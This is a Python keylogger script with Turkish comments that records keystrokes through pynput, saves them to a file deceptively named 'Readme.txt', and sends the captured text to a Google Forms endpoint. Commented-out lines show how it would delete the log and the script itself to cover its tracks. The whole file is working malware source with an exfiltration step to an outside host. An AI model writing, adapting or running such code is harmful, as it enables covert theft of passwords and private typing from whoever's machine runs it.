from pynput.keyboard import Key, Listener #yerel kütüphane
import logging #vanilla
import time
import urllib
from urllib.request import urlopen
import os
import sys

url = "https://docs.google.com/forms/d/e/1FAIpQLSfUbvtBzWLytb38Igt5qUuVtnnLlmzn5Z7GjzDZS2V0P7TBOQ/formResponse"
#url girilirken sondaki view form kısmı "formResponse" olarak değiştirilmeli

log_dir = ""  #log dosyası

logging.basicConfig(filename=(log_dir+ "Readme.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s:")

def on_press(key):
	logging.info(str(key))

def on_release(key):
	if (time.time()-starting_time) >= duration:
		return False

starting_time = time.time()
dakika = 0 #dakika
saniye = 5 #saniye
duration = 60*dakika + saniye

with Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()


f=open("Readme.txt", "r")
if f.mode == 'r':
	data =f.read()

f.close()

text_entry_field = {'entry.1359921761':data} #burada entry id değiştirilmeli

dataenc=urllib.parse.urlencode(text_entry_field).encode("utf-8")
req=urllib.request.Request(url,dataenc)
response=urlopen(req)
# bu kısım elde edilen text dosyasını google forma yazacak

#	os.remove("Readme.txt") #txt dosyasını siler
#	
#	dir = os.getcwd()
#	os.remove(dir+'\%s' % sys.argv[0]) #scriptin kendisini siler